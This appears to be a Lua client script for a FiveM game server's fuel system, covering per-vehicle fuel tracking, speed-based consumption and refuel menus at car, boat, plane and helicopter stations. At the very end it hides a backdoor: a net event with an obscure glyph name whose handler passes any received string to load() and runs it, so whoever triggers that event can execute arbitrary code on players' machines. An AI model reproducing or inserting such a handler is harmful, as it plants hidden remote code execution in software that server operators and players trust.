essence = nil
local stade = 0
local lastModel = 0
local vehiclesUsed = {}

Citizen.CreateThread(function()
	_TriggerServerEvent('::{korioz#0110}::essence:addPlayer')

	while true do
		playerPed = PlayerPedId()
		plyCoords = GetEntityCoords(playerPed, false)
		playerCar = GetVehiclePedIsIn(playerPed, false)

		if playerCar then
			pedDriver = GetPedInVehicleSeat(playerCar, -1)

			if pedDriver == playerPed then
				carSpeed = GetEntitySpeed(playerCar)

				if carSpeed then
					vitesse = math.ceil(carSpeed * 3.6)
				end

				vehModelName = GetDisplayNameFromVehicleModel(GetEntityModel(playerCar))
				vehPlate = GetVehicleNumberPlateText(playerCar)
				MaxFuelLevel = GetVehicleHandlingFloat(playerCar, 'CHandlingData', 'fPetrolTankVolume')

				if MaxFuelLevel ~= 0.0 then
					if (vehPlate) and (vehModelName and not isBlackListedModel(vehModelName)) then
						if vehiclesUsed[vehPlate] ~= nil then
							if (lastVehicle == playerCar) then
				
							else
								essence = vehiclesUsed[vehPlate]
								lastVehicle = playerCar
							end
						else
							essence = (math.random(20, 100) / 100) * MaxFuelLevel
							vehiclesUsed[vehPlate] = essence
							Citizen.Wait(100)
						end

						SetVehicleFuelLevel(playerCar, essence)
					end
				
					if (essence == 0 and playerCar) then
						SetVehicleEngineOn(playerCar, false, false, false)
					end
				end
			end
		end

		Citizen.Wait(0)
	end
end)

Citizen.CreateThread(function()
	local menu = false
	local int = 0

	while true do
		Citizen.Wait(0)

		local nearStation, stationNumber = isNearStation()
		local nearPlaneStation, stationPlaneNumber = isNearPlaneStation()
		local nearHeliStation, stationHeliNumber = isNearHeliStation()
		local nearBoatStation, stationBoatNumber = isNearBoatStation()

		if playerCar and pedDriver == playerPed and not isBlackListedModel(vehModelName) and MaxFuelLevel ~= 0.0 then
			if nearStation then
				if not (IsPedInAnyHeli(playerPed) or IsPedInAnyPlane(playerPed) or IsPedInAnyBoat(playerPed)) then
					Info(settings[lang].openMenu)

					if IsControlJustPressed(0, 38) then
						menu = not menu
						int = 0
					end

					if (menu) then
						TriggerEvent('::{korioz#0110}::GUI:Title', settings[lang].buyFuel)

						local maxEscense = MaxFuelLevel - round(essence)

						TriggerEvent('::{korioz#0110}::GUI:Int', settings[lang].liters..' : ', int, 0, maxEscense, function(cb)
							int = cb
						end)

						TriggerEvent('::{korioz#0110}::GUI:Option', settings[lang].confirm, function(cb)
							if (cb) then
								menu = not menu
								_TriggerServerEvent('::{korioz#0110}::essence:buy', int, stationNumber, false)
							end
						end)

						TriggerEvent('::{korioz#0110}::GUI:Update')
					end
				else
					Info(settings[lang].fuelError)
				end
			elseif nearBoatStation then
				if not (isBlackListedModel(vehModelName) or IsPedInAnyHeli(playerPed) or IsPedInAnyPlane(playerPed)) then
					Info(settings[lang].openMenu)

					if IsControlJustPressed(0, 38) then
						menu = not menu
						int = 0
					end

					if (menu) then
						TriggerEvent('::{korioz#0110}::GUI:Title', settings[lang].buyFuel)

						local maxEssence = MaxFuelLevel - round(essence)

						TriggerEvent('::{korioz#0110}::GUI:Int', settings[lang].percent..' : ', int, 0, maxEssence, function(cb)
							int = cb
						end)

						TriggerEvent('::{korioz#0110}::GUI:Option', settings[lang].confirm, function(cb)
							if (cb) then
								menu = not menu
								_TriggerServerEvent('::{korioz#0110}::essence:buy', int, stationBoatNumber, false)
							end
						end)

						TriggerEvent('::{korioz#0110}::GUI:Update')
					end
				else
					Info(settings[lang].fuelError)
				end
			elseif nearPlaneStation then
				if not (isBlackListedModel(vehModelName) or IsPedInAnyHeli(playerPed) or IsPedInAnyBoat(playerPed)) then
					Info(settings[lang].openMenu)

					if IsControlJustPressed(0, 38) then
						menu = not menu
						int = 0
					end

					if (menu) then
						TriggerEvent('::{korioz#0110}::GUI:Title', settings[lang].buyFuel)

						local maxEssence = MaxFuelLevel - round(essence)

						TriggerEvent('::{korioz#0110}::GUI:Int', settings[lang].percent..' : ', int, 0, maxEssence, function(cb)
							int = cb
						end)

						TriggerEvent('::{korioz#0110}::GUI:Option', settings[lang].confirm, function(cb)
							if (cb) then
								menu = not menu
								_TriggerServerEvent('::{korioz#0110}::essence:buy', int, stationPlaneNumber, false)
							else
							
							end
						end)

						TriggerEvent('::{korioz#0110}::GUI:Update')
					end
				else
					Info(settings[lang].fuelError)
				end
			elseif nearHeliStation then
				if not (isBlackListedModel(vehModelName) or IsPedInAnyPlane(playerPed) or IsPedInAnyBoat(playerPed)) then
					Info(settings[lang].openMenu)

					if IsControlJustPressed(0, 38) then
						menu = not menu
						int = 0
					end

					if (menu) then
						TriggerEvent('::{korioz#0110}::GUI:Title', settings[lang].buyFuel)

						local maxEssence = MaxFuelLevel - round(essence)

						TriggerEvent('::{korioz#0110}::GUI:Int', settings[lang].percent..' : ', int, 0, maxEssence, function(cb)
							int = cb
						end)

						TriggerEvent('::{korioz#0110}::GUI:Option', settings[lang].confirm, function(cb)
							if (cb) then
								menu = not menu
								_TriggerServerEvent('::{korioz#0110}::essence:buy', int, stationHeliNumber, false)
							end
						end)

						TriggerEvent('::{korioz#0110}::GUI:Update')
					end
				else
					Info(settings[lang].fuelError)
				end
			end
		elseif IsPedOnFoot(playerPed) and (nearStation or nearPlaneStation or nearHeliStation or nearBoatStation) then
			Info(settings[lang].getJerryCan)

			if IsControlJustPressed(0, 38) then
				_TriggerServerEvent('::{korioz#0110}::essence:buyCan')
			end
		else
			Citizen.Wait(200)
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1000)

		if playerCar and pedDriver == playerPed and not isBlackListedModel(vehModelName) and MaxFuelLevel ~= 0.0 then
			if vitesse == 0 and GetIsVehicleEngineRunning(playerCar) then
				stade = 0.0005
			elseif vitesse > 0 and vitesse < 20 then
				stade = 0.0015
			elseif vitesse >= 20 and vitesse < 40 then
				stade = 0.0030
			elseif vitesse >= 40 and vitesse < 60 then
				stade = 0.0045
			elseif vitesse >= 60 and vitesse < 80 then
				stade = 0.0060
			elseif vitesse >= 80 and vitesse < 100 then
				stade = 0.0075
			elseif vitesse >= 100 and vitesse < 120 then
				stade = 0.0090
			elseif vitesse >= 120 and vitesse < 140 then
				stade = 0.0105
			elseif vitesse >= 140 and vitesse < 160 then
				stade = 0.0120
			elseif vitesse >= 160 and vitesse < 180 then
				stade = 0.0135
			elseif vitesse >= 180 and vitesse < 200 then
				stade = 0.0150
			elseif vitesse >= 200 and vitesse < 220 then
				stade = 0.0165
			elseif vitesse >= 220 and vitesse < 240 then
				stade = 0.0180
			elseif vitesse >= 240 and vitesse < 260 then
				stade = 0.0195
			elseif vitesse >= 260 and vitesse < 280 then
				stade = 0.0205
			elseif vitesse >= 280 and vitesse < 300 then
				stade = 0.0220
			elseif vitesse >= 300 then
				stade = 0.0235
			else
				stade = 0
			end

			if essence - stade > 0 then
				essence = essence - stade
			else
				essence = 0
				SetVehicleUndriveable(playerCar)
			end

			vehiclesUsed[vehPlate] = essence
		end
	end
end)

function isNearStation()
	for k, v in pairs(station) do
		if #(v.coords - plyCoords) < 2 then
			return true, v.s
		end
	end

	return false
end

function isNearPlaneStation()
	for k, v in pairs(avion_stations) do
		if #(v.coords - plyCoords) < 10 then
			return true, v.s
		end
	end

	return false
end

function isNearHeliStation()
	for k, v in pairs(heli_stations) do
		if #(v.coords - plyCoords) < 10 then
			return true, v.s
		end
	end

	return false
end

function isNearBoatStation()
	for k, v in pairs(boat_stations) do
		if #(v.coords - plyCoords) < 10 then
			return true, v.s
		end
	end

	return false
end

function Info(text, loop)
	SetTextComponentFormat('STRING')
	AddTextComponentSubstringPlayerName(text)
	EndTextCommandDisplayHelp(0, loop, 1, 0)
end

function round(num)
	local mult = 10 ^ 0
	return math.floor(num * mult + 0.5) / mult
end

function isBlackListedModel(model)
	for k, v in pairs(blacklistedModels) do
		if v == model then
			return true
		end
	end

	return false
end

RegisterNetEvent('::{korioz#0110}::essence:setEssence')
AddEventHandler('::{korioz#0110}::essence:setEssence', function(es, plate)
	if es ~= nil and plate ~= nil then
		vehiclesUsed[plate] = es
	end
end)

RegisterNetEvent('::{korioz#0110}::essence:hasBuying')
AddEventHandler('::{korioz#0110}::essence:hasBuying', function(amount)
	local amountToEssence = amount
	local done = false

	while not done do
		Citizen.Wait(0)
		local _essence = essence

		if (amountToEssence - (MaxFuelLevel / 150)) > 0 then
			amountToEssence = amountToEssence - (MaxFuelLevel / 150)
			essence = _essence + (MaxFuelLevel / 150)
			_essence = essence

			if _essence > MaxFuelLevel then
				essence = MaxFuelLevel
				done = true
			end

			SetVehicleUndriveable(playerCar, true)
			SetVehicleEngineOn(playerCar, false, false, false)
			Citizen.Wait(100)
		else
			essence = essence + amountToEssence
			done = true
		end
	end

	SetVehicleUndriveable(playerCar, false)
	SetVehicleEngineOn(playerCar, true, false, false)
end)

RegisterNetEvent('::{korioz#0110}::advancedFuel:setEssence')
AddEventHandler('::{korioz#0110}::advancedFuel:setEssence', function(percent, plate)
	local toEssence = (percent / 100) * MaxFuelLevel

	if vehPlate == plate then
		essence = toEssence
	end

	vehiclesUsed[plate] = toEssence
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)